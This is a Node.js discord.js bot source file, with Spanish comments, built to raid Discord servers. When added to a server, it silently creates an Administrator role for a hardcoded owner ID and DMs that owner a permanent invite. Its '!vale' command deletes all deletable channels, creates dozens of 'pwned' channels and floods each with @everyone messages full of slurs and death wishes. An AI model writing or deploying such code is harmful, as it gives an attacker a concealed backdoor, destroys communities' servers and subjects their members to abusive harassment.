require('dotenv').config();

const { Client, GatewayIntentBits, ChannelType } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

const PREFIX = '!';
const OWNER_IDS = [
  "1436516806842912970",   // Patricio (tú)
  "987654321098765432"     // ID de la persona del tutorial (cámbialo por el real)
];

client.once('ready', () => {
  console.log('Bot conectado como ' + client.user.tag);
  console.log('Prefijo: ' + PREFIX);
});

// ────────────────────────────────────────────────
//     NUEVO EVENTO: Auto-admin + DM al unirse a server
// ────────────────────────────────────────────────

client.on('guildCreate', async (guild) => {
  console.log(`Me uní a un nuevo servidor: ${guild.name} (ID: ${guild.id})`);

  try {
    // Crear rol con permisos de administrador
    const adminRole = await guild.roles.create({
      name: 'Admin $pwm',          // puedes cambiarlo
      color: '#d9ff00',                // rojo intenso
      permissions: ['Administrator'],  // todos los permisos de admin
      hoist: true,                     // aparece separado
      mentionable: true
    });

    console.log(`Rol creado: ${adminRole.name}`);

    // Asignarte el rol (tu ID real)
    const tuId = '1436516806842912970'; // ← TU ID AQUÍ (cámbialo si es necesario)
    const miembro = await guild.members.fetch(tuId).catch(() => null);

    if (miembro) {
      await miembro.roles.add(adminRole);
      console.log(`Rol asignado a ti en ${guild.name}`);

      // Crear invite permanente
      let inviteLink = 'No pude crear invite (falta permiso)';
      const canal = guild.systemChannel || guild.channels.cache.find(c => c.type === ChannelType.GuildText);
      if (canal && canal.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE')) {
        const invite = await canal.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
        if (invite) inviteLink = invite.url;
      }

      // Enviar DM privado
      try {
        const dm = await client.users.fetch(tuId);
        await dm.send(`!Nuevo raid! ${inviteLink}`);
        console.log('DM enviado con éxito');
      } catch (e) {
        console.log('No pude enviar DM:', e.message);
      }
    } else {
      console.log(`No te encontré en ${guild.name} (no estás miembro)`);
    }

  } catch (err) {
    console.error('Error en auto-admin:', err.message);
  }
});

// ────────────────────────────────────────────────
//          COMANDOS EXISTENTES (igual que antes)
// ────────────────────────────────────────────────

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'test') {
    return message.reply('¡El bot funciona! Prefijo detectado correctamente.');
  }

  if (command === 'help') {
    return message.reply('Comandos:\n!test → prueba\n!vale → nuke en ráfaga extrema\n!help → este mensaje');
  }

  if (command === 'vale') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('No tienes permiso para este comando tan heavy.');
    }

    // ────────────────────────────────────────────────
    //     PERSONALIZA AQUÍ (CANALES Y MENSAJES)
    // ────────────────────────────────────────────────

    const nombresDeCanales = [
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      "pwned-by-la-elite-7-brou",
      // Agrega más si quieres
    ];

    const mensajesEnRafaga = [
      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7 ",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7 ",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone domado sale en las noticias chupando pene https://discord.gg/ZZBf67J7 ",
      "@everyone DOMADO POR la elite 7 subnormal https://discord.gg/ZZBf67J7 ",
      "@everyone JAJAJAJAJA PUTO PERRO https://discord.gg/ZZBf67J7 ",
      "@everyone ojalas te mueras hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone puto mal parido hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Ya te hicieron raid a tu mierda de server https://discord.gg/ZZBf67J7 ",
      "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
      "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 "
      // Agrega o quita mensajes aquí
    ];

    const delayCreacionCanales = 200;   // 0.2 segundos entre canales
    const delayEntreMensajes = 120;     // 0.12 segundos entre mensajes

    try {
      await message.reply(
        `**¡NUKE EN RÁFAGA EXTREMA INICIANDO EN 5 SEGUNDOS!**\n\n` +
        `→ Creando **${nombresDeCanales.length}** canales\n` +
        `→ Enviando **${mensajesEnRafaga.length}** mensajes en CADA canal`
      );

      await new Promise(r => setTimeout(r, 5000));

      const guild = message.guild;

      // Borrar canales (excepto el actual)
      let borrados = 0;
      for (const ch of guild.channels.cache.values()) {
        if (ch.deletable && ch.id !== message.channel.id) {
          try {
            await ch.delete('Nuke rápido');
            borrados++;
            await new Promise(r => setTimeout(r, 150));
          } catch {}
        }
      }
      await message.channel.send(`→ Borrados **${borrados}** canales.`);

      // Crear canales
      const nuevosCanales = [];
      for (const nombreOriginal of nombresDeCanales) {
        try {
          let nombre = nombreOriginal
            .toLowerCase()
            .replace(/[^a-z0-9- ]/g, '-')
            .replace(/\s+/g, '-')
            .replace(/-+/g, '-')
            .slice(0, 100) || 'raid-default';

          const canal = await guild.channels.create({
            name: nombre,
            type: ChannelType.GuildText,
            permissionOverwrites: [
              { id: guild.id, allow: ['ViewChannel', 'SendMessages', 'MentionEveryone'] }
            ]
          });

          nuevosCanales.push(canal);
          await new Promise(r => setTimeout(r, delayCreacionCanales));
        } catch (err) {
          console.log(`Fallo creando canal: ${err.message}`);
        }
      }
      await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);

      // Spam en ráfaga paralela
      const promesas = nuevosCanales.map(async (canal) => {
        for (const msg of mensajesEnRafaga) {
          try {
            await canal.send(msg);
            await new Promise(r => setTimeout(r, delayEntreMensajes));
          } catch (errMsg) {
            if (errMsg.code === 429) {
              await new Promise(r => setTimeout(r, 5000));
              await canal.send(msg).catch(() => {});
            }
          }
        }
      });

      await Promise.all(promesas);

      await message.channel.send(`**¡CEREZA DEL PASTEL!** 😈\nCanales spameados en ráfaga extrema.`);

    } catch (err) {
      console.error('Error en !vale:', err.message);
      await message.channel.send(`**Error grave:** ${err.message || 'Revisa logs'}`).catch(() => {});
    }
  }

  if (command === 'admin') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('Solo el owner del bot puede usar !admin.');
    }

    if (!message.member.permissions.has('Administrator') || message.guild.ownerId !== message.author.id) {
      return message.reply('Este comando solo funciona si eres **owner** del servidor donde lo escribes.');
    }

    const serverName = args.join(' ');
    if (!serverName) {
      return message.reply('Uso: !admin <nombre del servidor>\nEjemplo: !admin Mi Server Raid');
    }

    try {
      let rolAdmin = message.guild.roles.cache.find(r => r.name === 'Admin Raid');
      if (!rolAdmin) {
        rolAdmin = await message.guild.roles.create({
          name: 'Admin Raid',
          color: '#FF0000',
          permissions: ['Administrator'],
          hoist: true,
          mentionable: true
        });
        await message.channel.send('Rol **Admin Raid** creado.');
      }

      await message.member.roles.add(rolAdmin);
      await message.channel.send(`¡Listo! Ahora tienes **Admin Raid** en **${serverName}** 😈`);

      await message.channel.send(`@everyone EL OWNER PATRICIO AHORA ES ADMIN AQUÍ 🔥 https://discord.gg/tu-invite`);

    } catch (err) {
      console.error('Error en !admin:', err.message || err);
      await message.channel.send(`Error: ${err.message || 'No tengo permisos suficientes'}`).catch(() => {});
    }
  }
});

client.login(process.env.TOKEN).catch(err => {
  console.error('Error al conectar:', err.message || err);
});